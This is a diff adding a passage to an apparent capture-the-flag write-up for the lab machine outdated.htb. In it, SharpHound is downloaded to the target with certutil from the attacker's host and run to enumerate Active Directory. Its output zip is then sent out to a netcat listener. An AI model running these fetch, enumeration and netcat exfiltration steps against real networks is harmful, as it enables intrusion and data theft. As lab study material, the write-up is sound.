@@ -148,6 +148,46 @@ C:\Users\btables\AppData\Local\Temp\SDIAG_cdf76fc7-158d-434e-aeb6-a8529783b38e>S
 
 ![image](https://user-images.githubusercontent.com/105310322/190871592-ebc4c3ea-140d-4063-b9ea-0f4fe245d93a.png)
 
+https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpHound4.ps1
+
+copy and paste base64 code into a txt file
+
+cat sharp.txt | base64 -d sharp.gz
+gzip -d sharp.gz
+
+mkdir C:\\temp
+certutil -urlcache -f http://10.10.16.8:8000/sharp.exe sharp.exe
+```
+C:\temp>sharp.exe -c All --zipfilename sharp.zip
+sharp.exe -c All --zipfilename sharp.zip
+2022-09-17T18:40:29.1352817-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-09-17T18:40:29.6040263-07:00|INFORMATION|Initializing SharpHound at 6:40 PM on 9/17/2022
+2022-09-17T18:40:37.1213132-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
+2022-09-17T18:40:39.4383137-07:00|INFORMATION|Beginning LDAP search for outdated.htb
+2022-09-17T18:40:39.5728042-07:00|INFORMATION|Producer has finished, closing LDAP channel
+2022-09-17T18:40:39.5728042-07:00|INFORMATION|LDAP channel closed, waiting for consumers
+2022-09-17T18:41:11.6353570-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 36 MB RAM
+2022-09-17T18:41:38.3852031-07:00|INFORMATION|Consumers finished, closing output channel
+2022-09-17T18:41:38.5570555-07:00|INFORMATION|Output channel closed, waiting for output task to complete
+2022-09-17T18:41:39.7760241-07:00|INFORMATION|Status: 64 objects finished (+64 1.066667)/s -- Using 45 MB RAM
+Closing writers
+2022-09-17T18:41:45.6975730-07:00|INFORMATION|Status: 97 objects finished (+33 1.469697)/s -- Using 44 MB RAM
+2022-09-17T18:41:45.6975730-07:00|INFORMATION|Enumeration finished in 00:01:06.5847368
+2022-09-17T18:41:47.4040166-07:00|INFORMATION|SharpHound Enumeration Completed at 6:41 PM on 9/17/2022! Happy Graphing!
+
+C:\temp>
+```
+
+Transferring files in powershell was giving an error for using < with nc so I opted to use CMD
+
+```
+C:\temp>C:\\windows\\tasks\\nc.exe 10.10.16.8 1235 < 20220917184029_sharp.zip
+```
+```
+└─$ nc -lvnp 1235 > sharp.zip
+listening on [any] 1235 ...
+connect to [10.10.16.8] from (UNKNOWN) [10.129.57.67] 49802
+```
 
 https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1
 
